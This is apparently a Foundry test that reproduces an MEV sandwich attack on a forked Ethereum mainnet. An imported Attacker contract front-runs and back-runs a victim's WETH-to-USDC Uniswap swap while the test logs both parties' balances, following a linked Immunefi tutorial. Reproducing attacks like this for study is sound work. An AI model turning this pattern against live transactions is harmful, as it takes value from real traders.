// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "./Attacker.sol";

contract SandwichTest is Test {
    Attacker public attacker;
    address public victim;

    string RPC_URL = "https://rpc.ankr.com/eth";

    uint256 mainnetfork;

    IUniswapV2Router public Router =
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        mainnetfork = vm.createFork(RPC_URL);
        vm.selectFork(mainnetfork);
        vm.rollFork(17626926);

        victim = vm.addr(1);
        attacker = new Attacker();

        //console2.log("victim: ", victim, attacker);
        deal(address(WETH), victim, 1_000 ether);
        deal(address(WETH), address(attacker), 1_000 ether);
    }

    function _frontrun() internal {
        attacker.firstSwap(WETH.balanceOf(address(attacker)));
        //https://medium.com/immunefi/how-to-reproduce-a-simple-mev-attack-b38151616cb4
    }

    function _victim() internal {
        vm.startPrank(victim);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);
        console2.log("111");
        WETH.approve(address(Router), type(uint256).max);
        Router.swapExactTokensForTokens(
            WETH.balanceOf(victim),
            0,
            path,
            victim,
            block.timestamp + 4200
        );
        console2.log("222");
        vm.stopPrank();
    }

    function _backrun() internal {
        console2.log("secondSwap:", address(attacker));
        attacker.secondSwap(USDC.balanceOf(address(attacker)));
    }

    function testSandwich() public {
        console2.log(
            "USDC before: (attacker) ",
            attacker.getUSDCBalance(address(attacker))
        );
        console2.log(
            "WETH before: (attacker) ",
            attacker.getWETHBalance(address(attacker))
        );
        console2.log("USDC before: (victim) ", attacker.getUSDCBalance(victim));
        console2.log("WETH before: (victim) ", attacker.getWETHBalance(victim));

        _frontrun();
        _victim();
        _backrun();

        console2.log(
            "USDC after: (attacker) ",
            attacker.getUSDCBalance(address(attacker))
        );
        console2.log(
            "WETH after: (attacker) ",
            attacker.getWETHBalance(address(attacker))
        );
        console2.log("USDC after: (victim) ", attacker.getUSDCBalance(victim));
        console2.log("WETH after: (victim) ", attacker.getWETHBalance(victim));
    }
}
